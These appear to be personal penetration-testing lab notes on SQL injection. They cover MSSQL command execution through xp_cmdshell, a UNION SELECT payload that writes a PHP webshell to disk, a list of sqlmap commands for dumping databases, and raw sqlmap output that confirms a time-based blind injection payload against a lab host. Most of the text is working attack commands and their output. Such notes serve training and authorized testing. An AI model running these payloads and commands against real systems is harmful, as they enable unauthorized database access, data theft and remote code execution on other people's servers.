### MANUAL CODE EXECUTION

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-command-execution

└─$ impacket-mssqlclient Administrator:Lab123@192.168.231.18 -windows-auth

SQL> **EXECUTE sp_configure 'show advanced options', 1;**
INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.  ****
SQL> **RECONFIGURE; - to configure**
SQL> **EXECUTE sp_configure 'xp_cmdshell**', 1; **to open the xp_cmdshell**
 INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> **RECONFIGURE   ----applies all the changes**
SQL> 

SQL> EXECUTE xp_cmdshell 'whoami';
nt service\mssql$sqlexpress  

This could be used to write a Webshell to Disk via INTO OUTFILE directive
```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

### AUTOMATIC EXPLOTATION

### BEST MYSQL COMMANDS FOR PENETRATION TESTING
1. **Basic Scan:** Identify available databases
    `sqlmap -u "http://target-url.com/page.php?id=1" --dbs`
2. **Specify Database Type:** Choose the database management system.
    luaCopy code
    `sqlmap -u "http://target-url.com/page.php?id=1" --dbms=mysql`
3. **List Databases:** List databases on the target.
    luaCopy code
    `sqlmap -u "http://target-url.com/page.php?id=1" --dbs`
4. **List Tables in a Database:**
    luaCopy code
    `sqlmap -u "http://target-url.com/page.php?id=1" -D dbname --tables`
5. **Dump Table Data:** Retrieve and dump data from a table. 
    luaCopy code 
    `sqlmap -u "http://target-url.com/page.php?id=1" -D dbname -T tablename --dump`
6. **Fingerprint the Web App:** Identify the web app technology.
    luaCopy code
    `sqlmap -u "http://target-url.com/page.php?id=1" --fingerprint`
7. **Test for SQL Injection:** Thoroughly check for SQL injection vulnerabilities.
    `sqlmap -u "http://target-url.com/page.php?id=1" --risk 3 --level 5`
8. **Specify Cookies:** Use cookies for authentication.
    `sqlmap -u "http://target-url.com/page.php" --cookie="PHPSESSID=12345" --dbs`
9. **Use a Proxy:** Test through a proxy server.
    `sqlmap -u "http://target-url.com/page.php?id=1" --proxy="http://localhost:8080"`
10. **Specify User-Agent:** Set a custom User-Agent header.
    `sqlmap -u "http://target-url.com/page.php?id=1" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"`

We can use sqlmap to do an automated SQL injection
┌──(hollacosta㉿kali1)-[~]
└─$ sqlmap -u http://192.168.227.19/blindsqli.php?user=1 -p user
starting @ 14:59:05 /2023-10-01/
[14:59:05] [INFO] testing connection to the target URL
got a 302 redirect to 'http://192.168.227.19/login1.php?msg=2'. Do you want to follow? [Y/n] y
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=ib3f9kb10kc...Y
checking if the target is protected by some kind of WAF/IPS
testing if the target URL content is stable
heuristic (basic) test shows that GET parameter 'user' might not be injectable
 testing for SQL injection on GET parameter 'user'
testing 'AND boolean-based blind - WHERE or HAVING clause'
 testing 'Boolean-based blind - Parameter replace (original value)'
 testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                                                      
 testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
 testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'                                                                                     
 testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
testing 'Generic inline queries'
 testing 'PostgreSQL > 8.1 stacked queries (comment)'
 time-based comparison requires larger statistical model, please wait. (done)
 testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
 testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
GET parameter 'user' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable                                                                      
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] n
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [ Y
 testing 'Generic UNION query (NULL) - 1 to 20 columns'
 automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
checking if the injection point on GET parameter 'user' is a false positive
GET parameter 'user' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 77 HTTP(s) requests:
---
Parameter: user (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=1' AND (SELECT 1859 FROM (SELECT(SLEEP(5)))ezMr) AND 'KAko'='KAko
---
the back-end DBMS is MySQL
it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: PHP, Apache 2.4.52
back-end DBMS: MySQL >= 5.0.12
 fetched data logged to text files under '/home/hollacosta/.local/share/sqlmap/output/192.168.227.19'                                                                    


